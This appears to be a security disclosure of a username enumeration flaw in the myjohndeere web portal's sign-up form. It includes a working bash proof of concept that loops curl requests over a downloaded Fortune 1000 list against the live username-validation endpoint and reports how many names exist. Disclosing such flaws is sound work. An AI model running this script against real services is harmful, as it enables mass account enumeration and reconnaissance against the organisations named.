### Vulnerability Details

A username enumeration vulnerability in the John Deere Web Portal (myjohndeere) sign-up form allows an unauthenticated remote attacker to submit unlimited requests, resulting in potential mass username enumeration. A remote unauthenticated attacker can simply remove the cookie from the original request and replay an unlimited volume of username availability requests. An unauthenticated remote attacker can easily enumerate an organization's account username by submitting permutations of a target, with no observable rate-limit.

### Vendor Response
Submitted to vendor

### Proof of Concept

In this proof of concept I simulate a targetted, yet unsophisticated username enumeration of the Fortune 1000 list.

If an attacker would like to know which of the world's Fortune 1000 companies have a myjohndeere account:

```bash

# download  an arbitrary list, for example, Fortune 1000 https://github.com/dmarcelinobr/Datasets
wget https://raw.githubusercontent.com/dmarcelinobr/Datasets/master/Fortune1000.csv

while IFS=, read -r COMPANY JUNK; do
    TRIMMED_COMPANY="$(tr -dc "[:alnum:]" <<< "${COMPANY}")"
    echo "${TRIMMED_COMPANY}"
    USERNAME="${TRIMMED_COMPANY}"
    RESPONSE="$(curl 'https://myjohndeere.deere.com/wps/PA_myjd_live/struts/validateUserName' -H 'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://myjohndeere.deere.com' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Sec-GPC: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw "userName=${USERNAME}")"
    echo "${USERNAME}"$'\t'"${RESPONSE}" >> results.tsv
done < Fortune1000.csv

```

Results of Proof of Concept:

192/1000 alphanumeric only versions of Fortune 1000 companies retained an account.
